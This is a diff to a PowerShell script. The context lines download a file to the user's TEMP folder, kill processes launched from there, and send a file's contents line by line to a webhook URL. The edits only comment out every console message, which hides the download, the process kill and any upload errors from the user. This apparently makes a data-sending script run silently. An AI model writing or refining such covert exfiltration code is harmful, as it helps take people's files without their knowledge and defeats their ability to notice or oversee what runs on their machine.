@@ -49,7 +49,7 @@ $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Replace "down
 Invoke-WebRequest -Uri $url -OutFile $tempPath
 
 # Output the location of the downloaded file
-Write-Host "File downloaded to: $tempPath"
+#Write-Host "File downloaded to: $tempPath"
 
 ###############################################################################
 
@@ -106,7 +106,7 @@ Start-Sleep -Seconds 2
 Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force
 
 # Inform the user that the script is complete
-Write-Host "Process completed and all instances closed."
+#Write-Host "Process completed and all instances closed."
 
 
 
@@ -144,11 +144,11 @@ if (Test-Path $filePath) {
             Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
             Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
         } catch {
-            Write-Host "Error sending request: $_"
+            #Write-Host "Error sending request: $_"
         }
     }
 } else {
-    Write-Host "File not found: $filePath"
+    #Write-Host "File not found: $filePath"
 }
 
 
